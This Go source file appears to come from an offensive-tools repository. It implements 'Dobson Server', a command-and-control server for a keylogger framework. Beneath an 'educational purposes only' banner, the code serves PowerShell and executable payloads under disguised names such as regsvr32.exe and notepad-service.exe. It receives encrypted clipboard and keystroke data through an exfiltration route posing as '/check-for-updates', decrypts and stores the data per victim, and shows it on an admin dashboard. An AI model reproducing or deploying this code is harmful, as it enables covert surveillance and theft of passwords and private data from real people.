// -------------------------------------------------------------------------
// SECURITY RESEARCH & EDUCATIONAL PURPOSES ONLY
// This script is part of the BugWare repository, a collection of security tools
// and PoCs for learning about attack vectors.
// DO NOT USE THIS FOR ILLEGAL PURPOSES.
// -------------------------------------------------------------------------

/*
Program: Dobson Server
Description: Central Command and Control (C2) server for the Dobson framework, written in Go.
Author: CyberPanther232
Suite: BugWare
Version: 1.0
*/

package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/nacl/box"
)

// Admin Structures
type VictimRecord struct {
	RecordID   string
	ReceivedAt string
	Clipboard  string
	Keystrokes string
	Filename   string
}

type VictimPageData struct {
	VictimID string
	Records  []VictimRecord
}

func storeData(filename string, data []byte) error {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err := f.Write(data); err != nil {
		return err
	}

	return nil
}

func logCSV(id, timestamp, clipboard, keystrokes string) {
	// Create/Append to master CSV
	csvFile := filepath.Join("midges", "master_log.csv")
	f, err := os.OpenFile(csvFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("CSV Error:", err)
		return
	}
	defer f.Close()

	// Add header if new file
	info, _ := f.Stat()
	if info.Size() == 0 {
		f.WriteString("VictimID,Timestamp,DataType,Content\n")
	}

	// Sanitize CSV fields (simple quote escape)
	sanitize := func(s string) string {
		return fmt.Sprintf("\"%s\"", strings.ReplaceAll(s, "\"", "\"\""))
	}

	if len(clipboard) > 0 {
		line := fmt.Sprintf("%s,%s,Clipboard,%s\n", sanitize(id), sanitize(timestamp), sanitize(clipboard))
		f.WriteString(line)
	}
	if len(keystrokes) > 0 {
		line := fmt.Sprintf("%s,%s,Keystrokes,%s\n", sanitize(id), sanitize(timestamp), sanitize(keystrokes))
		f.WriteString(line)
	}
}

func parseMidgeFile(filepath string) (VictimRecord, error) {
	content, err := os.ReadFile(filepath)
	if err != nil {
		return VictimRecord{}, err
	}
	text := string(content)

	// Simple specific parsing based on processLogData format
	// === Record Received at TIMESTAMP ===
	// [Clipboard Data]
	// ...
	// [Keystrokes]
	// ...
	// ===============================

	record := VictimRecord{Filename: filepath}

	lines := strings.Split(text, "\n")
	var clipboardBuilder, keystrokeBuilder strings.Builder
	section := 0 // 0: header, 1: clipboard, 2: keystrokes

	for _, line := range lines {
		if strings.HasPrefix(line, "=== Record Received at") {
			parts := strings.Split(line, "at ")
			if len(parts) > 1 {
				record.ReceivedAt = strings.TrimSuffix(parts[1], " ===")
			}
			continue
		}
		if line == "[Clipboard Data]" {
			section = 1
			continue
		}
		if line == "[Keystrokes]" {
			section = 2
			continue
		}
		if strings.HasPrefix(line, "======") {
			continue
		}

		if section == 1 {
			clipboardBuilder.WriteString(line + "\n")
		} else if section == 2 {
			keystrokeBuilder.WriteString(line + "\n")
		}
	}

	record.Clipboard = strings.TrimSpace(clipboardBuilder.String())
	record.Keystrokes = strings.TrimSpace(keystrokeBuilder.String())

	// Fallback/Clean up empty markers
	if record.Clipboard == "(Empty)" {
		record.Clipboard = ""
	}
	if record.Keystrokes == "(Empty)" {
		record.Keystrokes = ""
	}

	return record, nil
}

// Admin Handlers
func adminDashboardHandler(w http.ResponseWriter, r *http.Request) {
	midgeDir := "midges"
	files, err := os.ReadDir(midgeDir)
	if err != nil {
		http.Error(w, "Could not read logs", http.StatusInternalServerError)
		return
	}

	victims := make(map[string]bool)
	for _, file := range files {
		if file.IsDir() {
			continue
		}
		name := file.Name()
		// Format: User_Timestamp_midge.txt
		if strings.HasSuffix(name, "_midge.txt") {
			base := strings.TrimSuffix(name, "_midge.txt")
			// Find the last underscore which separates user from timestamp
			lastUnderscore := strings.LastIndex(base, "_")
			if lastUnderscore != -1 {
				userID := base[:lastUnderscore]
				victims[userID] = true
			}
		}
	}

	var victimList []string
	for v := range victims {
		victimList = append(victimList, v)
	}

	tmpl, err := template.ParseFiles("templates/admin_dashboard.html")
	if err != nil {
		http.Error(w, "Template error: "+err.Error(), http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, victimList)
}

func victimViewHandler(w http.ResponseWriter, r *http.Request) {
	victimID := r.URL.Query().Get("id")
	if victimID == "" {
		http.Redirect(w, r, "/admin", http.StatusSeeOther)
		return
	}

	midgeDir := "midges"
	files, err := os.ReadDir(midgeDir)
	if err != nil {
		http.Error(w, "Could not read logs", http.StatusInternalServerError)
		return
	}

	var records []VictimRecord

	for _, file := range files {
		name := file.Name()
		// Check if file belongs to this victim
		// Expected: victimID_timestamp_midge.txt
		if strings.HasPrefix(name, victimID+"_") && strings.HasSuffix(name, "_midge.txt") {
			fp := filepath.Join(midgeDir, name)
			rec, err := parseMidgeFile(fp)
			if err == nil {
				// Extract timestamp part for ID
				base := strings.TrimSuffix(name, "_midge.txt")
				parts := strings.Split(base, "_")
				if len(parts) > 0 {
					rec.RecordID = parts[len(parts)-1]
				}
				records = append(records, rec)
			}
		}
	}

	data := VictimPageData{
		VictimID: victimID,
		Records:  records,
	}

	tmpl, err := template.ParseFiles("templates/victim_view.html")
	if err != nil {
		http.Error(w, "Template error: "+err.Error(), http.StatusInternalServerError)
		return
	}
	tmpl.Execute(w, data)
}

func downloadFileHandler(w http.ResponseWriter, r *http.Request) {
	filename := r.URL.Query().Get("file")
	// basic path traversal prevention
	if strings.Contains(filename, "..") || !strings.HasPrefix(filename, "midges") {
		http.Error(w, "Invalid file", http.StatusBadRequest)
		return
	}
	http.ServeFile(w, r, filename)

}

func decryptData(encryptedData []byte, nonce [24]byte, privateKey *[32]byte, publicKey *[32]byte) ([]byte, error) {
	decrypted, ok := box.Open(nil, encryptedData, &nonce, publicKey, privateKey)
	if !ok {
		return nil, fmt.Errorf("decryption failed")
	}
	return decrypted, nil
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		start := time.Now()
		next.ServeHTTP(w, r)
		log.Printf("%s %s %s %v", r.Method, r.URL.Path, r.RemoteAddr, time.Since(start))
	})
}

func processLogData(clipboard, keystrokes string) string {
	var sb strings.Builder
	timestamp := time.Now().Format("2006-01-02 15:04:05")

	sb.WriteString(fmt.Sprintf("=== Record Received at %s ===\n", timestamp))

	if len(clipboard) > 0 {
		sb.WriteString("[Clipboard Data]\n")
		sb.WriteString(clipboard)
		if !strings.HasSuffix(clipboard, "\n") {
			sb.WriteString("\n")
		}
	} else {
		sb.WriteString("[Clipboard Data] (Empty)\n")
	}

	if len(keystrokes) > 0 {
		sb.WriteString("[Keystrokes]\n")
		sb.WriteString(keystrokes)
		if !strings.HasSuffix(keystrokes, "\n") {
			sb.WriteString("\n")
		}
	} else {
		sb.WriteString("[Keystrokes] (Empty)\n")
	}

	fmt.Fprintf(&sb, "===============================\n\n")
	return sb.String()
}

func main() {
	fmt.Println("Starting server on :8080")

	// Generate a new key pair for demonstration purposes
	publicKey, privateKey, err := box.GenerateKey(rand.Reader)
	if err != nil {
		fmt.Println("Error generating key pair:", err)
		return
	}

	fmt.Println("Public Key:", publicKey)
	fmt.Println("Private Key:", privateKey)

	// Serve static assets (CSS/JS)
	fs := http.FileServer(http.Dir("static"))
	http.Handle("/static/", http.StripPrefix("/static/", fs))

	// Safe download handler for binaries under /static/downloads/
	http.HandleFunc("/static/downloads/", func(w http.ResponseWriter, r *http.Request) {
		rel := strings.TrimPrefix(r.URL.Path, "/static/downloads/")
		rel = filepath.Clean(rel)
		if rel == "." || rel == "" || strings.Contains(rel, "..") {
			http.NotFound(w, r)
			return
		}
		fp := filepath.Join("static", "downloads", rel)
		f, err := os.Open(fp)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		defer f.Close()
		info, err := f.Stat()
		if err != nil || info.IsDir() {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=\""+filepath.Base(fp)+"\"")
		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))
		http.ServeContent(w, r, info.Name(), info.ModTime(), f)
	})

	// Render the main template
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		tmpl, err := template.ParseFiles("templates/index.html")
		if err != nil {
			http.Error(w, "Template error", http.StatusInternalServerError)
			return
		}
		if err := tmpl.Execute(w, nil); err != nil {
			http.Error(w, "Render error", http.StatusInternalServerError)
			return
		}
	})

	// Serve PowerShell payloads from the larvae directory
	http.HandleFunc("/lay-eggs.ps1", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		http.ServeFile(w, r, "payloads/lay-eggs.ps1")
	})

	// Exfiltration Route
	http.HandleFunc("/check-for-updates", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var data map[string]string
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			http.Error(w, "Bad request", http.StatusBadRequest)
			return
		}

		// Check for required fields
		if data["id"] == "" || data["clipboard"] == "" || data["keystrokes"] == "" || data["nonce"] == "" || data["pubkey"] == "" {
			fmt.Println("Error: Missing data")
			http.Error(w, "Missing payload data", http.StatusBadRequest)
			return
		}

		// Get and process each field
		id := data["id"]

		fmt.Printf("Received data from ID: %s\n", id)

		// 1. Get Nonce (required for NaCL)
		nonceHex := data["nonce"]
		if nonceHex == "" {
			fmt.Println("Error: Missing nonce")
			http.Error(w, "Missing nonce", http.StatusBadRequest)
			return
		}
		nonceBytes, err := hex.DecodeString(nonceHex)
		if err != nil || len(nonceBytes) != 24 {
			fmt.Println("Error: Invalid nonce")
			http.Error(w, "Invalid nonce", http.StatusBadRequest)
			return
		}
		var nonce [24]byte
		copy(nonce[:], nonceBytes)

		// 2. Get Client Public Key (required for NaCL)
		pubKeyHex := data["pubkey"]
		if pubKeyHex == "" {
			fmt.Println("Error: Missing client public key")
			http.Error(w, "Missing pubkey", http.StatusBadRequest)
			return
		}
		pubKeyBytes, err := hex.DecodeString(pubKeyHex)
		if err != nil || len(pubKeyBytes) != 32 {
			fmt.Println("Error: Invalid public key")
			http.Error(w, "Invalid pubkey", http.StatusBadRequest)
			return
		}
		var clientPubKey [32]byte
		copy(clientPubKey[:], pubKeyBytes)

		// 3. Decode Ciphertext
		clipboardCipher, err := hex.DecodeString(data["clipboard"])
		if err != nil {
			fmt.Println("Error: Invalid clipboard hex")
			http.Error(w, "Invalid clipboard data", http.StatusBadRequest)
			return
		}
		keystrokesCipher, err := hex.DecodeString(data["keystrokes"])
		if err != nil {
			fmt.Println("Error: Invalid keystrokes hex")
			http.Error(w, "Invalid keystroke data", http.StatusBadRequest)
			return
		}

		// 4. Decrypt
		plainClipboard, err := decryptData(clipboardCipher, nonce, privateKey, &clientPubKey)
		if err != nil {
			fmt.Printf("Decryption failed for clipboard: %v\n", err)
			http.Error(w, "Decryption failed", http.StatusBadRequest)
			return
		}

		plainKeystrokes, err := decryptData(keystrokesCipher, nonce, privateKey, &clientPubKey)
		if err != nil {
			fmt.Printf("Decryption failed for keystrokes: %v\n", err)
			http.Error(w, "Decryption failed", http.StatusBadRequest)
			return
		}

		fmt.Printf("--- Decrypted Data ---\nClipboard: %s\nKeystrokes: %s\n----------------------\n", string(plainClipboard), string(plainKeystrokes))

		// Store data in midge file
		midgeDir := "midges"
		if _, err := os.Stat(midgeDir); os.IsNotExist(err) {
			os.Mkdir(midgeDir, 0755)
		}

		// Save as userID_timestamp_midge.txt
		// id comes as USERNAME_TIMESTAMP from agent
		filename := filepath.Join(midgeDir, fmt.Sprintf("%s_midge.txt", id))

		logEntry := processLogData(string(plainClipboard), string(plainKeystrokes))

		// Log to CSV as well
		logCSV(id, time.Now().Format("2006-01-02 15:04:05"), string(plainClipboard), string(plainKeystrokes))

		if err := storeData(filename, []byte(logEntry)); err != nil {
			fmt.Printf("Error storing data for ID %s: %v\n", id, err)
			// Don't fail the request if storage fails, but log it
		}

		w.Header().Set("Content-Type", "application/json")
		response := map[string]string{
			"status": "no updates",
		}
		json.NewEncoder(w).Encode(response)
	})

	midgeDir := "midges"
	if _, err := os.Stat(midgeDir); os.IsNotExist(err) {
		os.Mkdir(midgeDir, 0755)
	}
	absMidgeDir, _ := filepath.Abs(midgeDir)
	fmt.Printf("Midge storage directory: %s\n", absMidgeDir)

	// Admin Dashboard Routes
	http.HandleFunc("/admin", adminDashboardHandler)
	http.HandleFunc("/admin/victim", victimViewHandler)
	http.HandleFunc("/admin/download", downloadFileHandler)

	// Key Exchange Route
	http.HandleFunc("/key-exchange", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var requestData map[string]string
		if err := json.NewDecoder(r.Body).Decode(&requestData); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		// Test if client public key is provided
		clientPubKey := requestData["pubkey"]
		if clientPubKey == "" {
			http.Error(w, "Missing client public key", http.StatusBadRequest)
			return
		}
		_, err := hex.DecodeString(clientPubKey)
		if err != nil {
			http.Error(w, "Invalid client public key", http.StatusBadRequest)
			return
		}

		// Respond with server public key
		w.Header().Set("Content-Type", "application/json")
		response := map[string]string{
			"pubkey": fmt.Sprintf("%x", *publicKey),
		}
		if err := json.NewEncoder(w).Encode(response); err != nil {
			http.Error(w, "Server error", http.StatusInternalServerError)
			return
		}
	})

	http.HandleFunc("/regsvr32.exe", func(w http.ResponseWriter, r *http.Request) {
		fp := filepath.Join("payloads", "regsvr32.exe")
		f, err := os.Open(fp)
		if err != nil {
			http.NotFound(w, r)
			return
		}
		defer f.Close()

		info, err := f.Stat()
		if err != nil {
			http.NotFound(w, r)
			return
		}

		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=\"regsvr32.exe\"")
		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))

		http.ServeContent(w, r, info.Name(), info.ModTime(), f)
	})

	http.HandleFunc("/npp-service", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		http.ServeFile(w, r, "payloads/notepad-service.exe")
	})

	// Start the server

	if err := http.ListenAndServe(":8080", loggingMiddleware(http.DefaultServeMux)); err != nil {
		fmt.Println("Server error:", err)
	}
}
